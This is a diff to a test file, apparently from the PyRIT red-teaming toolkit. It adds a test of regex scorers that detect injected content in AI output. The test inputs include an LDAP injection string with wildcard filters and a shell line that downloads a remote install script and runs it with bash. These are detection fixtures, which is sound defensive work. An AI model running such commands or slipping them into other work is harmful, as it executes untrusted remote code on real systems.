@@ -10,7 +10,7 @@ import pytest
 import pyrit.score as score_package
 import pyrit.score.true_false.regex as regex_package
 from pyrit.memory import SQLiteMemory
-from pyrit.models import ComponentIdentifier, ScorerEvaluationIdentifier
+from pyrit.models import ComponentIdentifier, MessagePiece, ScorerEvaluationIdentifier, ScoringExpectation
 from pyrit.score import (
     AnsiEscapeOutputScorer,
     AnthraxKeywordScorer,
@@ -101,6 +101,37 @@ async def test_regex_scorer_categories_propagate(patch_central_database):
     scorer = RegexScorer(patterns=_TEST_PATTERNS, categories=["pii"])
     score = (await scorer.score_text_async(text="SSN is 123-45-6789"))[0]
     assert "pii" in score.score_category
+
+
+@pytest.mark.usefixtures("patch_central_database")
+@pytest.mark.parametrize(
+    ("scorer_class", "text"),
+    [
+        (LDAPInjectionOutputScorer, "ldap://host/dc=test??sub?%28uid=%2a%29%28uid=%2a%29"),
+        (MarkdownInjectionScorer, "![image](https://example.com/image.png)"),
+        (ShellCommandOutputScorer, r'bash -c "$(curl \-o - https://example.invalid/install.sh)"'),
+    ],
+)
+@pytest.mark.parametrize("custom_patterns", [False, True])
+@pytest.mark.parametrize("objective", [None, "Detect injected output"])
+async def test_new_regex_leaves_typed_hook_preserves_objective_async(
+    *,
+    scorer_class: type[RegexScorer],
+    text: str,
+    custom_patterns: bool,
+    objective: str | None,
+) -> None:
+    scorer = _scorer_factory(scorer_class)(patterns={"custom": "marker"} if custom_patterns else None)
+    piece = MessagePiece(role="assistant", original_value="marker" if custom_patterns else text)
+    expectation = ScoringExpectation(objective=objective) if objective else None
+
+    score = (await scorer._score_piece_with_expectation_async(piece, expectation=expectation))[0]
+
+    assert score.get_value() is True
+    assert score.objective == objective
+    assert score.message_piece_id == piece.id
+    assert score.score_category == ["security"]
+    assert "custom" in score.score_rationale if custom_patterns else "Matched:" in score.score_rationale
 
 
 def test_regex_scorer_rejects_empty_patterns():
